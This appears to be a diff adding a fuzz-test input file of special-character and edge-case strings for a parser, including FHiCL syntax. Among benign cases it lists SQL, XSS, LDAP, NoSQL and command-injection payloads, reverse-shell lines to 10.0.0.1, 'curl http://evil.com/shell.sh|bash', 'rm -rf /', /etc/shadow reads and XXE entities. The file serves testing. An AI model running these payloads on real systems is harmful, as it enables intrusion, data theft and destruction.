@@ -1,0 +1,1544 @@
+# ============================================================================
+# BASIC SPECIAL CHARACTERS
+# ============================================================================
+# Hash character at start
+#general
+###triple_hash###
+# This is a comment
+Price is $50 # discount available
+##################################################
+#
+ #
+# #
+#  #  #
+&ampersand_start
+Tom & Jerry
+a=1&b=2&c=3
+&&&triple_amp&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&
+ &
+& &
+&  &  &
+/forward/slash/path
+/home/user/data/file.txt
+https://example.com/api/v1/data
+///triple_slash///
+//////////////////////////////////////////////////
+/
+ /
+/ /
+/  /  /
+It's a test
+name='John'
+He said 'hello'
+''''multiple_quotes''''
+''''''''''''''''''''''''''''''''''''''''''''''''''
+'
+ '
+' '
+'  '  '
+She said "Hello World"
+"quoted" and "more quotes"
+"""triple_double_quotes"""
+""""""""""""""""""""""""""""""""""""""""""""""""""
+"
+ "
+" "
+"  "  "
+
+# ============================================================================
+# ESCAPE SEQUENCES
+# ============================================================================
+Line 1\nLine 2\nLine 3
+Tab\there\tand\there
+Backslash\\path\\here
+\\\\multiple\\\\backslashes\\\\
+\n\n\n\n\n\n\n\n\n\n
+\t\t\t\t\t\t\t\t\t\t
+\r\r\r\r\r\r\r\r\r\r
+\b\b\b\b\b\b\b\b\b\b
+\f\f\f\f\f\f\f\f\f\f
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\\n\\t\\r\\b\\f\\v\\a\\0
+\n\t\r\b\f mixed escapes
+\\\\\\\\\\\\\\\\
+\\\n\\\t\\\r
+\\"\\'\\#\\&\\/
+\"\'
+\'\"
+\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\
+\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'
+
+# ============================================================================
+# MIXED SPECIAL CHARACTER COMBINATIONS
+# ============================================================================
+Mixed: "quotes" and 'apostrophes' and \\ backslash
+#&/'"\#&/'"\ combined special chars
+http://host/path?a=1&b=2#fragment
+#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&#&
+/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/"/'/
+&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'&"&'
+"#"&"/"'"\"#"&"/"'"\"#"&"/"'"\"#"&"/"'"\"#"&"/
+'#'&'/'\"''#'&'/'\"''#'&'/'\"''#'&'/'\"''#'&'/'\
+/#/&/'/"/\/#/&/'/"/\/#/&/'/"/\/#/&/'/"/\/#/&/'/"/\
+&#&/&'&"&\&#&/&'&"&\&#&/&'&"&\&#&/&'&"&\&#&/&'&"&\
+
+# ============================================================================
+# SQL INJECTION PATTERNS
+# ============================================================================
+'; DROP TABLE users; --
+" OR "1"="1
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+'; EXEC xp_cmdshell('dir'); --
+' UNION SELECT * FROM users--
+" UNION SELECT * FROM users--
+'; INSERT INTO users VALUES('hacked'); --
+' AND 1=0 UNION SELECT username,password FROM users--
+'; WAITFOR DELAY '00:00:10'; --
+' AND SLEEP(10)--
+'; SHUTDOWN; --
+' OR ''='
+" OR ""="
+'||'
+"||"
+' AND '1'='1
+" AND "1"="1
+'; SELECT pg_sleep(10); --
+' AND 1=1#
+" AND 1=1#
+admin'--
+admin"--
+1' ORDER BY 1--
+1' ORDER BY 100--
+' HAVING 1=1--
+' GROUP BY 1--
+-1' UNION SELECT 1,2,3--
+0x27
+%27
+&#39;
+&#x27;
+\x27
+\047
+\u0027
+
+# ============================================================================
+# XSS ATTACK PATTERNS
+# ============================================================================
+<script>alert('XSS')</script>
+<div class="test">&amp;</div>
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')">
+<input onfocus="alert('XSS')" autofocus>
+<marquee onstart="alert('XSS')">
+<video><source onerror="alert('XSS')">
+<audio src=x onerror="alert('XSS')">
+<details open ontoggle="alert('XSS')">
+<math><maction actiontype="statusline#http://google.com">
+<a href="javascript:alert('XSS')">click</a>
+<a href="data:text/html,<script>alert('XSS')</script>">
+javascript:alert('XSS')
+vbscript:msgbox('XSS')
+<script>alert(String.fromCharCode(88,83,83))</script>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://evil.com/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a]ert("XSS")</SCRIPT>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# ============================================================================
+# COMMAND INJECTION PATTERNS
+# ============================================================================
+grep -r "pattern" /var/log/* | awk '{print $1}' && echo 'done' # comment
+; rm -rf /
+| cat /etc/passwd
+$(whoami)
+`id`
+&& echo 'pwned' #
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+; cat /etc/shadow
+| cat /etc/shadow
+$(cat /etc/passwd)
+`cat /etc/passwd`
+;sleep 10
+|sleep 10
+||sleep 10
+&&sleep 10
+;ping -c 10 127.0.0.1
+|ping -c 10 127.0.0.1
+$(ping -c 10 127.0.0.1)
+`ping -c 10 127.0.0.1`
+;nc -e /bin/sh 10.0.0.1 4444
+|nc -e /bin/sh 10.0.0.1 4444
+;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+$IFS
+${IFS}
+$PATH
+${PATH}
+;$0
+;${0}
+$(ls)
+`ls`
+$((1+1))
+;curl http://evil.com/shell.sh|bash
+|wget http://evil.com/shell.sh -O- |bash
+%0a
+%0d
+%00
+\n
+\r
+\x00
+\x0a
+\x0d
+
+# ============================================================================
+# PATH TRAVERSAL PATTERNS
+# ============================================================================
+../../../etc/passwd
+%2e%2e%2f&encoded
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+..%5c..%5c..%5cetc/passwd
+..%255c..%255c..%255cetc/passwd
+%252e%252e%252f
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+/etc/passwd%00.jpg
+/etc/passwd%00.png
+....//....//....//....//....//....//....//....//etc/passwd
+/var/log/../../../etc/passwd
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/dev/null
+/dev/zero
+/dev/random
+/dev/urandom
+file:///etc/passwd
+file://localhost/etc/passwd
+\\\\localhost\\c$\\windows\\system32\\config\\sam
+C:\\Windows\\System32\\config\\SAM
+C:/Windows/System32/config/SAM
+/..../....//etc/passwd
+.../...//etc/passwd
+
+# ============================================================================
+# LDAP INJECTION PATTERNS
+# ============================================================================
+*)(uid=*))(|(uid=*
+admin)(&(password=*))
+x][(objectClass=*)]#comment
+*)(objectClass=*)
+)(cn=*)(|(cn=*
+*)(|(password=*
+admin)(|(objectclass=*))
+*))%00
+)(uid=*))(|(uid=*
+*()|%26'
+admin)(!(&(1=0))
+admin)(|(password=*))(&
+*)(uid=*))(&(uid=*
+
+# ============================================================================
+# NOSQL INJECTION PATTERNS
+# ============================================================================
+{"$gt": ""}
+{"$where": "this.password == 'x'"}
+'; return this.password; var x='
+{"$regex": ".*"}
+{"$ne": null}
+{"$exists": true}
+{"$nin": []}
+{"$or": [{"a": 1}, {"b": 2}]}
+{"$and": [{"a": 1}, {"b": 2}]}
+{"$not": {"$eq": ""}}
+{"username": {"$regex": "^admin"}}
+{"$comment": "test"}
+{$where: "sleep(5000)"}
+{$where: "function(){sleep(5000)}"}
+{"$type": 2}
+{"$size": 0}
+{"$all": []}
+{"$elemMatch": {}}
+true, $where: '1 == 1'
+, $or: [ {}, { 'a': 'a'
+' || 'a'=='a
+" || "a"=="a
+{$gt: ""}
+{$ne: ""}
+{$lt: "z"}
+[$ne]=1
+username[$ne]=toto&password[$ne]=toto
+{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"x"}}
+
+# ============================================================================
+# FORMAT STRING PATTERNS
+# ============================================================================
+%s%s%s%s%s%s%s%s%s%s
+%n%n%n%n
+%(name)s #'\"&/
+%x%x%x%x%x%x%x%x
+%d%d%d%d%d%d%d%d
+%p%p%p%p%p%p%p%p
+%c%c%c%c%c%c%c%c
+%u%u%u%u%u%u%u%u
+%o%o%o%o%o%o%o%o
+%08x.%08x.%08x.%08x
+%n%n%n%n%n%n%n%n
+%hn%hn%hn%hn
+%hhn%hhn%hhn%hhn
+AAAA%08x.%08x.%08x.%08x
+%1$s%2$s%3$s
+%1$n%2$n%3$n
+%.1024d
+%1000000d
+%(foo)s
+{0}{1}{2}
+{foo}{bar}
+${foo}
+$foo
+%{foo}
+#{foo}
+
+# ============================================================================
+# LOG INJECTION PATTERNS
+# ============================================================================
+user logged in\nAdmin: user deleted all records
+action=login\r\naction=delete&target=all#hidden
+test\n[ERROR] System compromised
+test\r\n[ADMIN] Access granted
+\n\nFake log entry\n\n
+\x0aFake log entry
+\x0dFake log entry
+%0aFake log entry
+%0dFake log entry
+test\n[2024-01-01 00:00:00] ADMIN: password changed
+\nSet-Cookie: admin=true
+\r\nX-Injected: header
+\nLocation: http://evil.com
+\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK
+
+# ============================================================================
+# REGEX PATTERNS
+# ============================================================================
+^[a-zA-Z0-9_#&]+$
+/api/v[0-9]+/.*
+\"([^\"]+)\"
+'([^']*)'|\"([^\"]*)\"
+.*
+.+
+.?
+^$
+^.*$
+(?:)
+(?=)
+(?!)
+(?<=)
+(?<!)
+(a+)+$
+((a+)+)+$
+(a|aa)+$
+(a|a?)+$
+([a-zA-Z]+)*$
+(.*a){100}
+^(a+)+$
+(x+x+)+y
+\d+
+\w+
+\s+
+\S+
+\D+
+\W+
+[^\x00-\x7F]+
+[\x00-\x1F]+
+[[:alpha:]]+
+[[:digit:]]+
+\\b\\w+\\b
+(?i)test
+(?m)^test$
+(?s).*
+(?x) test # comment
+\p{L}+
+\P{L}+
+
+# ============================================================================
+# JSON EDGE CASES
+# ============================================================================
+{\"key\": \"value\", \"num\": 123}
+{\"nested\": {\"deep\": {\"value\": true}}}
+{\"array\": [1, 2, 3, 4, 5]}
+{\"empty_object\": {}}
+{\"empty_array\": []}
+{\"null_value\": null}
+{\"bool_true\": true}
+{\"bool_false\": false}
+{\"unicode\": \"\\u0000\\u001f\\u007f\"}
+{\"escaped\": \"\\\"\\\\\\b\\f\\n\\r\\t\"}
+{\"incomplete
+[1,2,3
+"unterminated
+{key:
+[{"a":1},{
+{"key": "value",}
+[1, 2, 3,]
+{"key": undefined}
+{'key': 'value'}
+{key: value}
+{\"key\": NaN}
+{\"key\": Infinity}
+{\"key\": -Infinity}
+{\"key\": +123}
+{\"key\": .123}
+{\"key\": 123.}
+{\"key\": 0x1F}
+{\"key\": 0777}
+{\"key\": 1e+999}
+{\"key\": 1e-999}
+{\"dup\": 1, \"dup\": 2}
+{\"__proto__\": {}}
+{\"constructor\": {}}
+{\"prototype\": {}}
+{\"toString\": \"hacked\"}
+{\"valueOf\": \"hacked\"}
+{\"hasOwnProperty\": \"hacked\"}
+
+# ============================================================================
+# XML/HTML ENTITIES
+# ============================================================================
+&lt;&gt;&amp;&quot;&#39;
+&nbsp;&copy;&reg;&trade;
+&#x0;&#x1;&#x2;&#x3;&#x4;&#x5;
+&#0;&#1;&#2;&#3;&#4;&#5;
+&#x00;&#x01;&#x02;&#x03;&#x04;&#x05;
+&apos;
+&#34;
+&#38;
+&#60;
+&#62;
+&#160;
+&amp;amp;
+&amp;lt;
+&amp;gt;
+&amp;quot;
+&amp;apos;
+<!DOCTYPE foo>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY xxe SYSTEM "http://evil.com/xxe">
+<?xml version="1.0"?>
+<!--comment-->
+<![CDATA[data]]>
+<!ATTLIST foo bar CDATA #IMPLIED>
+%entity;
+&#xD;&#xA;
+&#13;&#10;
+
+# ============================================================================
+# FHICL SYNTAX PATTERNS
+# ============================================================================
+process_name: "test" # comment\nmodule: { type: "Analyzer" }
+#include "base.fcl"\nBEGIN_PROLOG\n@local::value\nEND_PROLOG
+@local::variable
+@table::table_name
+@sequence::seq_name
+@id::unique_id
+@nil
+@erase
+BEGIN_PROLOG
+END_PROLOG
+physics: {\n  analyzers: {}\n  producers: {}\n  filters: {}\n}
+source: {\n  module_type: RootInput\n  fileNames: []\n}
+services: {\n  TFileService: { fileName: "out.root" }\n}
+outputs: {\n  out1: { module_type: RootOutput }\n}
+process_name: @local::process
+trigger_paths: [ path1, path2 ]
+end_paths: [ output ]
+table: { @table::base key: value }
+seq: [ @sequence::base, item ]
+
+# ============================================================================
+# UNICODE AND ENCODING
+# ============================================================================
+\\u0000
+\\u001f
+\\u007f
+\\u0080
+\\u00ff
+\\u0100
+\\u0fff
+\\u1000
+\\uffff
+\\uD800
+\\uDFFF
+\\uD800\\uDC00
+\\uDBFF\\uDFFF
+\\uFFFE
+\\uFFFF
+\\u202E
+\\u202D
+\\u200B
+\\u200C
+\\u200D
+\\uFEFF
+\\u2028
+\\u2029
+\\u0000\\u0000\\u0000
+Caf\\u00e9
+na\\u00efve
+r\\u00e9sum\\u00e9
+\\u4e2d\\u6587
+\\u65e5\\u672c\\u8a9e
+\\ud55c\\uad6d\\uc5b4
+\\u0391\\u0392\\u0393
+\\u0410\\u0411\\u0412
+\\u05d0\\u05d1\\u05d2
+\\u0627\\u0628\\u0629
+%00
+%01
+%1f
+%7f
+%80
+%ff
+%u0000
+%u001f
+%u007f
+
+# ============================================================================
+# BRACKETS AND DELIMITERS
+# ============================================================================
+((((
+))))
+{{{{
+}}}}
+[[[[
+]]]]
+({[}])
+<<<<<<
+>>>>>>
+((((((((((((((((((((((((((((((((((((((((((((((((((
+))))))))))))))))))))))))))))))))))))))))))))))))))
+{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
+}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
+]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+<><><><><><><><><><><><><><><><><><><><><><><><><>
+()()()()()()()()()()()()()()()()()()()()()()()()()(
+{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
+[][][][][][][][][][][][][][][][][][][][][][][][][][
+([{<>}])([{<>}])([{<>}])([{<>}])([{<>}])
+)]}><[{(
+>}])([{<
+}])([{<>
+])([{<>}
+)([{<>}]
+([{<>}])
+
+# ============================================================================
+# URL AND PROTOCOL PATTERNS
+# ============================================================================
+http://
+https:/
+ftp:
+//host
+://
+?&=#
+http://user:pass@host:8080/path?query=value#fragment
+https://[::1]:8080/path
+https://127.0.0.1:8080
+https://localhost
+http://0.0.0.0
+http://0
+http://127.1
+http://2130706433
+http://0x7f.0x00.0x00.0x01
+http://0177.0000.0000.0001
+ftp://ftp.example.com/file.txt
+sftp://user@host/path
+ssh://user@host
+telnet://host:23
+file:///etc/passwd
+file://localhost/etc/passwd
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+javascript:alert(1)
+vbscript:msgbox(1)
+mailto:test@example.com
+tel:+1234567890
+sms:+1234567890
+geo:37.7749,-122.4194
+magnet:?xt=urn:btih:
+ldap://host/dc=example,dc=com
+gopher://host:70/
+dict://host:2628/
+news:comp.lang.c
+nntp://host/group
+irc://host/channel
+xmpp:user@host
+rtsp://host/stream
+mms://host/stream
+ws://host/socket
+wss://host/socket
+redis://host:6379
+mongodb://host:27017/db
+mysql://user:pass@host:3306/db
+postgres://user:pass@host:5432/db
+
+# ============================================================================
+# ENVIRONMENT VARIABLES AND TEMPLATES
+# ============================================================================
+${variable}
+{{mustache}}
+<%=erb%>
+{#comment#}
+@{value}
+$#&/'"mixed
+$HOME
+${PATH}
+$USER/$HOME
+${VAR:-default}
+${VAR:+set}
+$#&special
+${!indirect}
+${var:0:5}
+${var#pattern}
+${var##pattern}
+${var%pattern}
+${var%%pattern}
+${var/pattern/replace}
+${var//pattern/replace}
+${#var}
+$((1+1))
+$((RANDOM))
+${RANDOM}
+$RANDOM
+$(command)
+`command`
+%USERPROFILE%
+%APPDATA%
+%TEMP%
+%PATH%
+%COMPUTERNAME%
+%USERNAME%
+%OS%
+$ENV{PATH}
+$ENV{'PATH'}
+$ENV{"PATH"}
+{{#each items}}{{.}}{{/each}}
+{{#if condition}}yes{{else}}no{{/if}}
+<%= expression %>
+<% code %>
+<%# comment %>
+<%- expression %>
+${env.HOME}
+#{ruby_expression}
+@(powershell)
+!(expression)
+
+# ============================================================================
+# NUMERIC EDGE CASES
+# ============================================================================
+0
+-0
++0
+0.0
+-0.0
++0.0
+.0
+0.
+-.0
++.0
+1
+-1
++1
+123
+-456
++789
+3.14
+-3.14
++3.14
+.123
+-.123
++.123
+123.
+-123.
++123.
+1e10
+1E10
+1e+10
+1e-10
+1E+10
+1E-10
+-1e10
+-1e+10
+-1e-10
+1.23e4
+1.23e+4
+1.23e-4
+-1.23e4
+-1.23e+4
+-1.23e-4
+0x1F
+0X1f
+0x0
+0xFFFFFFFF
+0xFFFFFFFFFFFFFFFF
+0777
+0o777
+0O777
+0b1010
+0B1010
+NaN
+nan
+NAN
+Infinity
+infinity
+INFINITY
+-Infinity
+-infinity
+-INFINITY
++Infinity
++infinity
++INFINITY
+1.7976931348623157e+308
+-1.7976931348623157e+308
+5e-324
+-5e-324
+2.2250738585072014e-308
+1e309
+1e-325
+9999999999999999999999999999999999999999
+-9999999999999999999999999999999999999999
+0.0000000000000000000000000000000000000001
+-0.0000000000000000000000000000000000000001
+
+# ============================================================================
+# BOOLEAN AND NULL VARIATIONS
+# ============================================================================
+true
+false
+TRUE
+FALSE
+True
+False
+yes
+no
+YES
+NO
+Yes
+No
+on
+off
+ON
+OFF
+On
+Off
+1
+0
+null
+NULL
+Null
+nil
+NIL
+Nil
+none
+NONE
+None
+undefined
+UNDEFINED
+Undefined
+void
+VOID
+Void
+\\0
+\\x00
+nul
+NUL
+\\u0000
+
+# ============================================================================
+# WHITESPACE AND CONTROL CHARACTERS
+# ============================================================================
+
+
+
+
+
+
+
+\n
+\r
+\t
+\b
+\f
+\v
+\0
+\r\n
+\n\r
+ \t\n\r\f\v
+\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f
+\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
+\x7f
+\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f
+\\x00\\x01\\x02
+\\a\\b\\f\\v
+^A^B^C
+^D^E^F
+^G^H^I
+^J^K^L
+^M^N^O
+^P^Q^R
+^S^T^U
+^V^W^X
+^Y^Z^[
+^\\^]^^
+^_
+\\cA\\cB\\cC
+<NUL><SOH><STX>
+<ETX><EOT><ENQ>
+<ACK><BEL><BS>
+<HT><LF><VT>
+<FF><CR><SO>
+<SI><DLE><DC1>
+<DC2><DC3><DC4>
+<NAK><SYN><ETB>
+<CAN><EM><SUB>
+<ESC><FS><GS>
+<RS><US><DEL>
+
+# ============================================================================
+# BINARY/FILE SIGNATURE PATTERNS
+# ============================================================================
+\\x89PNG\\r\\n\\x1a\\n
+GIF89a
+GIF87a
+%PDF-1.4
+%PDF-1.7
+PK\\x03\\x04
+PK\\x05\\x06
+\\xff\\xd8\\xff\\xe0
+\\xff\\xd8\\xff\\xe1
+\\x00\\x00\\x01\\x00
+\\x00\\x00\\x02\\x00
+MZ
+\\x7fELF
+\\xca\\xfe\\xba\\xbe
+\\xfe\\xed\\xfa\\xce
+\\xfe\\xed\\xfa\\xcf
+BM
+RIFF
+OggS
+fLaC
+ID3
+\\xff\\xfb
+\\x1f\\x8b
+BZh
+\\xfd7zXZ\\x00
+Rar!\\x1a\\x07
+7z\\xbc\\xaf\\x27\\x1c
+\\x04\\x22\\x4d\\x18
+LZIP
+\\x1a\\x45\\xdf\\xa3
+\\x30\\x26\\xb2\\x75
+FWS
+CWS
+ZWS
+\\xd0\\xcf\\x11\\xe0
+\\x00\\x01\\x00\\x00
+SQLite format 3\\x00
+BEGIN:VCARD
+BEGIN:VCALENDAR
+
+# ============================================================================
+# BASE64-LIKE AND ENCODED PATTERNS
+# ============================================================================
+dGVzdA==
+dGVzdCBzdHJpbmc=
+SGVsbG8gV29ybGQh
+YWRtaW46cGFzc3dvcmQ=
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+eyJrZXkiOiAidmFsdWUifQ==
+QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=
+YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=
+MDEyMzQ1Njc4OQ==
+Kzw+Lz0/
+YCF+IUAjJCVeJiooKV8rLT1bXXt9fFw7JzoiLC4vPD4/
+///
++++
+===
+AAA=
+AA==
+AAAA
+/+/+
++/+/
+====
+YQ==
+YWI=
+YWJj
+YWJjZA==
+YWJjZGU=
+YWJjZGVm
+
+# ============================================================================
+# JWT AND TOKEN PATTERNS
+# ============================================================================
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
+eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UifQ.
+Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.rTCH8cLoGxAm_xw68z-zXVKi9ie6xJn9tnVWjd_9ftE
+Basic YWRtaW46cGFzc3dvcmQ=
+Digest username="admin"
+NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
+OAuth oauth_consumer_key="key"
+AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE
+sk_test_4eC39HqLyjWDarjtT1zdp7dc
+pk_test_TYooMQauvdEDq54NiTphI7jx
+rk_live_51HGqKwLMYZ1234567890
+ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+glpat-xxxxxxxxxxxxxxxxxxxx
+xoxb-xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxx
+xoxp-xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxx
+AKIA[A-Z0-9]{16}
+ABIA[A-Z0-9]{16}
+ACCA[A-Z0-9]{16}
+ASIA[A-Z0-9]{16}
+
+# ============================================================================
+# SHELL METACHARACTERS
+# ============================================================================
+;
+|
+||
+&
+&&
+>
+>>
+<
+<<
+<<<
+>|
+>&
+<&
+2>&1
+2>/dev/null
+>/dev/null 2>&1
+|&
+$()
+``
+*
+?
+[abc]
+[!abc]
+[a-z]
+{a,b,c}
+~
+~user
+$*
+$@
+$#
+$?
+$$
+$!
+$0
+$1
+$_
+$-
+"$var"
+'$var'
+\$var
+${var}
+$(cmd)
+`cmd`
+$((expr))
+$[expr]
+((expr))
+[[expr]]
+!cmd
+!$
+!*
+!-1
+^old^new
+!!
+!n
+!string
+\
+\\
+\'
+\"
+\$
+\`
+\n
+\t
+\r
+# comment
+: builtin
+.
+source
+eval
+exec
+
+# ============================================================================
+# CRLF AND LINE ENDING VARIATIONS
+# ============================================================================
+line1\nline2\nline3
+line1\r\nline2\r\nline3
+line1\rline2\rline3
+a\nb\r\nc\rd\n\re
+\n\n\n
+\r\r\r
+\r\n\r\n\r\n
+\n\r\n\r\n\r
+text\nSet-Cookie: admin=true
+text\r\nSet-Cookie: admin=true
+text\nX-Injected-Header: value
+text\r\nX-Injected-Header: value
+%0d%0aSet-Cookie: admin=true
+%0aX-Injected: true
+%0d%0a%0d%0a<html>
+\r\n\r\nHTTP/1.1 200 OK\r\n
+\nContent-Length: 0\n\n
+\r\nLocation: http://evil.com\r\n\r\n
+
+# ============================================================================
+# SINGLE CHARACTER EDGE CASES
+# ============================================================================
+#
+&
+/
+'
+"
+\
+\n
+\t
+\r
+
+.
+,
+;
+:
+!
+?
+@
+$
+%
+^
+*
+(
+)
+[
+]
+{
+}
+<
+>
+=
++
+-
+_
+~
+`
+|
+
+# ============================================================================
+# TRUNCATED AND MALFORMED DATA
+# ============================================================================
+ends with backslash\
+incomplete \
+partial escape \x
+partial escape \u
+partial escape \u00
+partial escape \u000
+partial unicode \uD800
+partial surrogate \uD800\u
+mismatched \uD800\uD800
+truncated {"key":
+truncated ["item
+truncated "string
+escaped at end \"
+escaped at end \\
+base64 truncated YWJj
+base64 invalid YWJj====
+base64 bad char YWJj!@#$
+url encoded %
+url encoded %2
+url encoded %GG
+html entity &
+html entity &#
+html entity &#x
+html entity &#123
+html entity &amp
+incomplete tag <div
+incomplete tag </div
+incomplete comment <!--
+incomplete cdata <![CDATA[
+
+# ============================================================================
+# REPEATED PATTERNS FOR BUFFER/MEMORY TESTS
+# ============================================================================
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+################################################################
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+////////////////////////////////////////////////////////////////
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
+\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+$($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(
+{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
+}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
+]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
+))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+# ============================================================================
+# WORST CASE COMBINATIONS
+# ============================================================================
+http://host/path?a=1&b=2#frag\nSQL: '; DROP TABLE x; --\nHTML: <div class="test">&amp;</div>\nShell: `rm -rf /` && echo 'done' # comment\nRegex: ^[#&/'"]+$\nJSON: {\"key\": \"val\\\"ue\"}\nPath: ../../../etc/passwd\nFmt: %s%n%x\n\\x00\\xFF\\u0000
+!@#$%^&*()_+-=[]{}|;':",./<>?
+The quick brown fox jumps over the lazy dog #1 & "quoted" with /slashes/ and 'apostrophes' plus \\backslashes\\
+'; DROP TABLE x; -- <script>alert("XSS")</script> | rm -rf / && $(whoami) `id` ../../../etc/passwd {"$gt":""} %s%n%x \\x00 {{template}} ${var} @local::value #comment &entity; /path/ "quotes" 'apostrophes'
+#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\#&/'"\\
+\n\r\t\b\f\\\"\'\n\r\t\b\f\\\"\'\n\r\t\b\f\\\"\'\n\r\t\b\f\\\"\'
+<script>alert('#&/\\"\\')</script>'; DROP TABLE x WHERE col='#&/\\"\\''--
+{{#each}}${VAR}@local::val#comment&amp;/path/"quotes"'apos'\\back{{/each}}
